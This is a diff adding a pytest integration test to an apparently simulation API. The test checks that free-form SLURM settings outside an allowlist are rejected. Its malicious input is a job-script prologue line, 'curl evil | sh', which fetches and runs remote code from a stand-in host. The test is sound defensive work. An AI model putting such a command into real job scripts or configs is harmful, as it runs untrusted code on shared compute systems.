@@ -252,6 +252,19 @@ def test_create_simulation_rejects_slurm_log_directory_outside_home(client):
 
 
 @pytest.mark.integration
+def test_create_simulation_refuses_free_form_slurm_settings(client):
+    """Settings outside the allowlist never reach SLURMCluster (MADIV-28 W0.4)."""
+    payload = _minimal_simulation_payload()
+    payload["compute_backend"] = "slurm"
+    payload["compute_backend_config"] = {"job_script_prologue": ["curl evil | sh"]}
+
+    response = client.post("/api/v1/simulations/", json=payload)
+
+    assert response.status_code == 400
+    assert "job_script_prologue" in response.json()["detail"]
+
+
+@pytest.mark.integration
 def test_get_simulation_status(client):
     """Test getting simulation status."""
     simulation_id = "test-id-123"
